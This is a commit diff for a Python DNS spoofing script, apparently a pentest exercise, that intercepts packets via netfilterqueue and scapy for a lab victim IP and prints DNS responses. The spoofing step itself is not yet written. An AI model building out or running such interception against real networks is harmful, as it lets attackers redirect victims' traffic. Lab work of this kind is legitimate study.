dd8fedc8462540df52542506da0c120f5acfb199
Vhackenstance <hackenstance@proton.me>
2026-06-03 07:30:54 -0500

    Filter packet for DNS Response

--- dns_spoof.py
+++ dns_spoof.py
@@ -1,20 +1,22 @@
 #!/usr/bin/env python2
 # Rebuild
 import netfilterqueue
-import scapy.all as scapy
+from scapy.layers.inet import IP
+from scapy.layers.dns import DNSRR
 
 target_ip_vm = "192.168.63.174"
 target_interface_vm = "Ethernet0"
 new_target_ip = "192.168.63.139"
 target_DN = "www.pentest-standard.org"
 # 44.238.29.244
-# pentest-standard.org
-# 96.126.116.56
+# rrname = 'pentest-standard.org'
+# rdata = 96.126.116.56
 
 def process_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
-    print(scapy_packet.show())
-    # packet.drop()
+    scapy_packet = IP(packet.get_payload())
+    if scapy_packet.haslayer(DNSRR):
+        print(scapy_packet.show())
+        # packet.drop()
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
